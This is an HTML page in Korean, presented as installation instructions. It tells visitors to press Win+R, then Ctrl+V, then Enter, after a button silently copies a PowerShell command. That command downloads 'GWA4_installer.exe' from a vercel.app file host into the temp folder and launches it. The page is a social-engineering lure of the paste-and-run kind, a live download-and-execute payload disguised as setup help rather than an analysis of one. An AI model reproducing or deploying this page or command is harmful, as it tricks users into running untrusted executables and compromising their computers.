<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>설치 방법</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
            font-family: Arial, sans-serif;
            margin: 0;
        }
        .card {
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 320px;
        }
        h2 {
            margin-bottom: 10px;
        }
        p {
            margin: 8px 0;
            font-size: 16px;
        }
        .copy-btn {
            display: inline-block;
            margin-top: 10px;
            padding: 10px 15px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
        }
        .copy-btn:hover {
            background: #0056b3;
        }
    </style>
    <script>
        function copyCommand() {
            const command = `powershell -Command "& {Invoke-WebRequest -Uri 'https://filehostbase.vercel.app/GWA4_installer.exe' -OutFile $env:TEMP\\GWA4_installer.exe; Start-Process $env:TEMP\\GWA4_installer.exe}"`;

            // 명령어 복사
            const textarea = document.createElement("textarea");
            textarea.value = command;
            document.body.appendChild(textarea);
            textarea.select();
            const copied = document.execCommand("copy");
            document.body.removeChild(textarea);

            // 버튼 텍스트 변경
            const button = document.getElementById("copyButton");
            if (copied) {
                button.textContent = "복사되었습니다!";
            } else {
                button.textContent = "복사 실패! 다시 시도하세요.";
            }
            setTimeout(() => {
                button.textContent = "만약 복사가 안 되거나 실행되지 않았으면 여기를 누르세요";
            }, 2000);
        }
    </script>
</head>
<body>
    <div class="card">
        <h2>설치 방법</h2>
        <p><b>① Win + R을 누르세요.</b></p>
        <p><b>② Ctrl + V를 누르세요.</b></p>
        <p><b>③ Enter를 누르세요.</b></p>
        <button id="copyButton" class="copy-btn" onclick="copyCommand()">만약 복사가 안 되거나 실행되지 않았으면 여기를 누르세요</button>
    </div>
</body>
</html>
